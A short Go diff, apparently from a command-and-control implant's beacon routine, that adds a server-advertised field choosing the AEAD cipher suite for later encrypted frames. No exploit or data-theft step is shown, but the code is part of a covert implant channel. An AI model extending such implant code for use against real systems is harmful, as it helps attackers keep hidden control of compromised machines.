@@ -222,6 +222,7 @@ func doBeacon() {
 			Mac           string `json:"mac"`
 			Reregister    bool   `json:"reregister"`
 			NetworkConfig string `json:"network_config"`
+			SessionCipher string `json:"sc"`
 		}
 		if err := json.Unmarshal(respBody, &authResp); err != nil {
 			if Debug {
@@ -260,6 +261,8 @@ func doBeacon() {
 		// per-implant secret). The response MAC already authenticated the frame,
 		// so the config is trustworthy.
 		applyServerNetworkConfig(authResp.NetworkConfig)
+		// Advertised AEAD suite for subsequent encrypted frames (empty = AES-GCM).
+		ecdhSess.setSuite(authResp.SessionCipher)
 		// On registration the server derived its session from our identity key
 		// (the register frame carries IdentityPub); on a handshake it used the
 		// ephemeral key we presented. Derive our side with the matching key.
